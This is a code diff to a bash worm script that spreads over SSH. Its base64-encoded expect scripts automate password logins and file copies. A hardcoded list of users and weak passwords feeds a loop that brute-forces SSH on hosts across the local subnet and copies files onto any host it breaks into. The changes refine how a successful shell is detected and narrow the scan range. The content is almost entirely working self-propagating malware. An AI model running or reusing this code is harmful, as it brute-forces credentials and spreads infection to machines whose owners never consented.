@@ -77,19 +77,6 @@ bmw_extract_body()
 }
 # bmw_phase2_end
 
-ssh_crack_exp="IyEvdXNyL2Jpbi9leHBlY3QKCnNldCBJUCBbbGluZGV4ICRhcmd2IDBdCnNldCBVU0VSIFtsaW5k
-ZXggJGFyZ3YgMV0Kc2V0IFBBU1NXRCBbbGluZGV4ICRhcmd2IDJdCnNldCBDTUQgW2xpbmRleCAk
-YXJndiAzXQpzZXQgVElNRU9VVCBbbGluZGV4ICRhcmd2IDRdCnNldCB0aW1lb3V0IFtsaW5kZXgg
-JGFyZ3YgNF0KCnNwYXduIC1ub2VjaG8gc3NoIC1vIFNlcnZlckFsaXZlSW50ZXJ2YWw9JFRJTUVP
-VVQgLW8gQ29ubmVjdFRpbWVvdXQ9JFRJTUVPVVQgLXQgJFVTRVJAJElQICRDTUQKZXhwZWN0IHsK
-CSIoeWVzL25vKSIgeyBzZW5kICJ5ZXNcciI7IGV4cF9jb250aW51ZSB9CgkiKmFzc3dvcmQ6IiB7
-IHNlbmQgIiRQQVNTV0RcciIgfQoJIlBhc3N3b3JkIGZvciIgeyBzZW5kICIkUEFTU1dEXHIiIH0K
-CSJOYW1lIG9yIHNlcnZpY2Ugbm90IGtub3duIiB7IGV4aXQgMX0KCSJObyByb3V0ZSB0byBob3N0
-IiB7IGV4aXQgMiB9CgkiQ29ubmVjdGlvbiByZWZ1c2VkIiB7IGV4aXQgOSB9CgkiTGFzdCBsb2dp
-bjoiIHsgZXhpdCAzfQoJdGltZW91dCB7IGV4aXQgNCB9Cgllb2YgeyBleGl0IDAgfQp9CgpleHBl
-Y3QgewogICAgICAgICIqYXNzd29yZDoiIHsgZXhpdCA1IH0KCSJQYXNzd29yZCBmb3IiIHsgZXhp
-dCA4IH0KICAgICAgICAidWlkPSIgeyBleGl0IDYgfQogICAgICAgIGVvZiB7IGV4aXQgNyB9Cn0K"
-
 scp_crack_exp="IyEvdXNyL2Jpbi9leHBlY3QKCnNldCBJUCBbbGluZGV4ICRhcmd2IDJdCnNldCBVU0VSIFtsaW5k
 ZXggJGFyZ3YgMV0Kc2V0IFBBU1NXRCBbbGluZGV4ICRhcmd2IDVdCnNldCBMT0NBTF9GSUxFIFts
 aW5kZXggJGFyZ3YgMF0Kc2V0IFRJTUVPVVQgW2xpbmRleCAkYXJndiA0XQpzZXQgdGltZW91dCBb
@@ -104,6 +91,22 @@ eGl0IDN9Cgl0aW1lb3V0IHsgZXhpdCA0IH0KCWVvZiB7IGV4aXQgMCB9Cn0KCmV4cGVjdCB7CiAg
 ICAgICAgIiphc3N3b3JkOiIgeyBleGl0IDUgfQoJIlBhc3N3b3JkIGZvciIgeyBleGl0IDggfQog
 ICAgICAgIGVvZiB7IGV4aXQgMCB9Cn0K"
 
+ssh_crack_exp="IyEvdXNyL2Jpbi9leHBlY3QKCnNldCBJUCBbbGluZGV4ICRhcmd2IDBdCnNldCBVU0VSIFtsaW5k
+ZXggJGFyZ3YgMV0Kc2V0IFBBU1NXRCBbbGluZGV4ICRhcmd2IDJdCnNldCBDTUQgW2xpbmRleCAk
+YXJndiAzXQpzZXQgVElNRU9VVCBbbGluZGV4ICRhcmd2IDRdCnNldCB0aW1lb3V0IFtsaW5kZXgg
+JGFyZ3YgNF0KCnNwYXduIC1ub2VjaG8gc3NoIC1vIFNlcnZlckFsaXZlSW50ZXJ2YWw9JFRJTUVP
+VVQgLW8gQ29ubmVjdFRpbWVvdXQ9JFRJTUVPVVQgLXQgJFVTRVJAJElQICRDTUQKZXhwZWN0IHsK
+CSIoeWVzL25vKSIgeyBzZW5kICJ5ZXNcciI7IGV4cF9jb250aW51ZSB9CgkiKmFzc3dvcmQ6IiB7
+IHNlbmQgIiRQQVNTV0RcciIgfQoJIlBhc3N3b3JkIGZvciIgeyBzZW5kICIkUEFTU1dEXHIiIH0K
+CSJOYW1lIG9yIHNlcnZpY2Ugbm90IGtub3duIiB7IGV4aXQgMX0KCSJObyByb3V0ZSB0byBob3N0
+IiB7IGV4aXQgMiB9CgkiQ29ubmVjdGlvbiByZWZ1c2VkIiB7IGV4aXQgOSB9CgkiQ29ubmVjdGlv
+biByZXNldCBieSBwZWVyIiB7ZXhpdCA5fQoJdGltZW91dCB7IGV4aXQgNCB9Cgllb2YgeyBleGl0
+IDEwIH0KfQoKZXhwZWN0IHsKICAgICAgICAiKmFzc3dvcmQ6IiB7IGV4aXQgNSB9CgkiUGFzc3dv
+cmQgZm9yIiB7IGV4aXQgOCB9CiAgICAgICAgInVpZD0iIHsgZXhpdCAxMDAgfQoJIipdJCIgeyBl
+eGl0IDEwMCB9CgkiKl0jIiB7IGV4aXQgMTAwIH0KCSIqJCIgeyBleGl0IDEwMCB9CgkiKiMiIHsg
+ZXhpdCAxMDAgfQoJIkxhc3QgbG9naW46IiB7IGV4aXQgMTAwIH0KICAgICAgICBlb2YgeyBleGl0
+IDcgfQp9Cg=="
+
 ssh_crack_user=("root" "wzt")
 ssh_crack_passwd=("123456" "111" "giveshell" "afafa" "afafdfafdf")
 
@@ -116,17 +119,21 @@ bmw_ssh_copy_file()
 
 bmw_ssh_crack()
 {
-	local user passwd
+	local user passwd ret
 
 	for user in ${ssh_crack_user[*]}
 	do
 		for passwd in ${ssh_crack_passwd[*]}
 		do
 			./ssh_crack.exp $1 $user $passwd "" 4
-			if [ $? -eq 0 ]; then
+			ret=$?
+			echo -e "\nretcode: $ret\n"
+			if [ $ret -eq 100 ]; then
 				echo -ne "\ttrying $user => $passwd\t[success]\n"
 				bmw_ssh_copy_file $1 $2 $user $passwd
 				return 
+			elif [ $ret -eq 9 ]; then
+				break;
 			else
 				echo -ne "\ttrying $user => $passwd\t[failed]\r"
 			fi
@@ -165,7 +172,7 @@ bmw_infect_net()
 	bmw_crack_init
 	[ $? -eq 1 ] && return 1
 
-	for ((i = 1; i <= 254; i++))
+	for ((i = 136; i <= 138; i++))
 	do
 		ip="$host.$i"
 		echo -e "ping $ip"
